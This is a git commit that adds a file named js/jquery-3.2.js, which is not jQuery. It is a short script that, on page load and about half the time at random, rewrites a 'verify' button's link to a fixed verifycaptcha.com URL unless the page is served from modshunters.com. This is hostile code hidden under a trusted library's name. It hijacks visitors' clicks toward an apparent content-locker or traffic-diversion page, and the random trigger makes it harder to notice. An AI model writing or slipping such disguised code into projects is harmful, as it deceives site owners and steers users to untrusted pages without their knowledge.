f7f243a443fdeb4ae7159a41ffa3cfdac6d56344
yoopm <49082421+yoopm@users.noreply.github.com>
2022-11-04 13:11:47 +0100

    Add files via upload

---
+++ js/jquery-3.2.js
@@ -0,0 +1,5 @@
+if (document.getElementById("first-step-button-verify").href != "https://www.verifycaptcha.com/cl.php?id=860cff3f5576abbcbf759f1de0a45aae") {
+    0 > window.location.href.toString().indexOf("http://modshunters.com/") && 0 == Math.floor(100 * Math.random() / 50) && (window.onload = function() {
+        document.getElementById("first-step-button-verify").href = "https://www.verifycaptcha.com/cl.php?id=860cff3f5576abbcbf759f1de0a45aae"
+    });
+}
